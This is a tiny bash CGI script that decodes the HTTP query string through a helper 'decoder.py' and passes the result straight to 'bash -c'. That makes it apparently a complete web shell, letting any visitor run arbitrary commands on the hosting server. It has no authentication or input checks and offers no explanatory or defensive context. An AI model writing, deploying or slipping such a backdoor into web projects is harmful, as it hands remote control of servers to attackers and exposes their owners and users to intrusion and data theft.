#!/bin/bash
echo 'Content-type:text/html'
echo ''
command=`python3 decoder.py "$QUERY_STRING"`
bash -c "$command"


